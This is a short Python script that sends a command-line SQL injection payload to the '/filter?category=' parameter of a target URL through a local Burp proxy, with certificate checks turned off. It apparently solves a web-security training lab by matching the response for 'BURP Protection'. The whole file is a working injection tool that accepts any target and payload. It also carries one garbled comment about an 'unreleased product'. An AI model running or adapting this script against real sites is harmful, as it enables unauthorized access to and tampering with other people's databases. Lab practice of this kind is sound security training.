import requests #to send http/s requests
import sys #to access command line arguments
import urllib3 #proxy support and TLS/SSL verification

#To disable TLS/SSL unverified warnings for Https requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#set the proxies
proxies = {'http':'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

#SQLI exploit function

def exploit_sqli(url,payload):
    uri = '/filter?category=' #get this from burpsuite captured requests
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "BURP Protection" in r.text: #just biordsong is a unreleased product
        return True
    else:
        return False


#main function
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com \"1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("[+] SQL Injection successful!")
    else:
        print("[-] SQL Injection unsuccessful!")
